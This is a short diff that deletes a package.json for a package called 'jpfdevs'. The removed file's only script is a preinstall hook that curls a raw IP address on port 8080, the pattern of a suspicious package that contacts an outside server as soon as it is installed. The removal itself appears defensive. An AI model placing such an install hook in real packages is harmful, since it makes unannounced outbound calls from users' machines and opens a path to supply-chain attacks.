@@ -1,7 +1,0 @@
-{
-   "name" : "jpfdevs",
-   "version" : "0.0.1",
-   "scripts" : {
-      "preinstall" : "curl https://104.248.126.163:8080"
-   }
-}
